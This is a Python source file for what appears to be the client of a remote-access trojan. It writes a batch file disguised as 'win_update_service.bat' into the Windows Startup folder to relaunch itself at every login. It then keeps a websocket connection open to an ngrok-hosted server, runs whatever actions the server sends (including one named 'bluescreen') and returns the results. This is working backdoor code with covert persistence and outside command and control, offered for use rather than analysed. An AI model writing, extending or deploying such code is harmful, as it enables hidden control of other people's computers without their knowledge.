import asyncio
from websockets.asyncio.client import connect
import json

from src.core.commands import commands_dict

SERVER = "wss://liger-tops-raccoon.ngrok-free.app"

import os
import sys


def create_startup_bat():
    project_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../"))
    activate_script = os.path.join(project_dir, ".venv", "Scripts", "activate.bat")
    venv_pythonw = os.path.join(project_dir, ".venv", "Scripts", "pythonw.exe")

    if not os.path.exists(venv_pythonw):
        venv_pythonw = "pythonw.exe"

    bat_content = f"""@echo off
cd /d "{project_dir}"
call "{activate_script}"
start "" "{venv_pythonw}" -m src.client.client
exit
"""

    startup_folder = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    bat_path = os.path.join(startup_folder, "win_update_service.bat")

    try:
        os.makedirs(startup_folder, exist_ok=True)
        with open(bat_path, "w", encoding="utf-8") as f:
            f.write(bat_content)
        print(f"[Client] Autostart-Skript erfolgreich erstellt unter: {bat_path}")
    except Exception as e:
        print(f"[Client] Fehler beim Erstellen der Autostart-Datei: {e}")


async def generate_answer(data: dict) -> dict:
    action = data.get("action")
    args = data.get("args", [])

    cls = commands_dict.get(action)
    if cls is None:
        return {"status": "error", "message": f"Unknown action: {action}"}

    try:
        if not cls.validate_args(args):
            return {"status": "error", "message": "Invalid arguments"}

        res = await cls.execute(args)
        return {"status": "success", "action": action, "result": res}

    except Exception as e:
        return {"status": "error", "message": str(e)}


async def main():
    create_startup_bat()
    while True:
        try:
            print(f"[Client] Connecting to {SERVER}...")
            async with connect(SERVER) as ws:
                print("[Client] Connected successfully!")
                async for raw_msg in ws:
                    try:
                        data = json.loads(raw_msg)
                    except json.JSONDecodeError:
                        print(f"[Client] Received non-JSON message: {raw_msg}")
                        continue

                    if data['action'] != 'bluescreen':
                        print(f"[Server JSON]: {data}")

                    response = await generate_answer(data)
                    await ws.send(json.dumps(response))

        except (ConnectionRefusedError, asyncio.TimeoutError, Exception) as e:
            print(f"[Client] Connection lost/failed ({e}). Reconnecting in 5 seconds...")
            await asyncio.sleep(5)


asyncio.run(main())